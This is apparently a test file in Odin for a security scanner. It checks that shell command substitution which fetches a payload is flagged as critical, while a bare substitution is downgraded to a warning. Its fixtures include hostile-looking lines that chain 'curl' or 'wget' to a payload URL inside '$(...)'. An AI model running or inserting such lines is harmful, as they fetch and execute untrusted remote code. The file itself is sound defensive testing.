package test

import "core:fmt"
import "core:os"
import "core:strings"
import "core:testing"

import "../src/security"

write_coupling_file :: proc(dir: string, name: string, content: string) -> string {
	path := strings.concatenate({dir, "/", name})
	os.write_entire_file(path, transmute([]u8)content)
	return path
}

@(test)
test_command_substitution_requires_fetch :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	cases := []struct{
		line: string,
		expect_critical: bool,
	}{
		{"echo ok;$(whoami)", false},
		{"echo ok;$(curl https://example.com/payload)", true},
		{"echo ok | $(wget https://example.com/payload)", true},
	}

	for entry, idx in cases {
		temp_dir := setup_test_environment(fmt.tprintf("coupling_%d", idx))
		defer teardown_test_environment(temp_dir)

		path := write_coupling_file(temp_dir, fmt.tprintf("case_%d.sh", idx), entry.line)
		defer delete(path)

		result := security.scan_module(temp_dir, security.Scan_Options{})
		defer security.cleanup_scan_result(&result)

		if entry.expect_critical {
			testing.expect(t, result.critical_count > 0, "command substitution with fetch should be critical")
		} else {
			testing.expect(t, result.critical_count == 0, "command substitution without fetch should downgrade")
			testing.expect(t, result.warning_count > 0, "downgraded command substitution should be warning")
		}
	}
}
